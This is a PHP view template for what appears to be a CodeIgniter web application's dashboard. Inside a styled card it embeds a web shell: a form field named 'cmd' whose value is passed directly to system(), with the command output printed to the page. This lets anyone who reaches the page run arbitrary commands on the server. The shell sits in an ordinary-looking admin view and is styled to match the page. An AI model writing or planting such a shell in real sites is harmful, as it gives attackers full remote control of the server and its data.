<?php
defined('BASEPATH') or exit('No direct script access allowed');
?>
<!-- Main content -->
<div class="content">
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-12 col-xs-12">

                <div class="card" style="background-color: #424648;">
                    <div class="card-header card-header-rose card-header-icon">
                        <div class="card-icon">
                            <i class="material-icons">language</i>
                        </div>


                        <div class="card-tools">
                            <div class="row">
                                <div class="col-lg-2">
                                    <!-- <a href="<?php echo base_url('users/setting'); ?>" class="btn btn-block btn-primary">Edit Profile</a> -->
                                </div>
                            </div>
                        </div>

                    </div>

                    <html>

                    <head>

                    </head>

                    <body>
                        <html>

                        <body>
                            <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
                                <input type="TEXT" name="cmd" autofocus id="cmd" size="80" style="background-color: #424648;">
                                <input type="SUBMIT" value="Execute">
                            </form>
                            <pre>
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
</pre>
                        </body>

                        </html>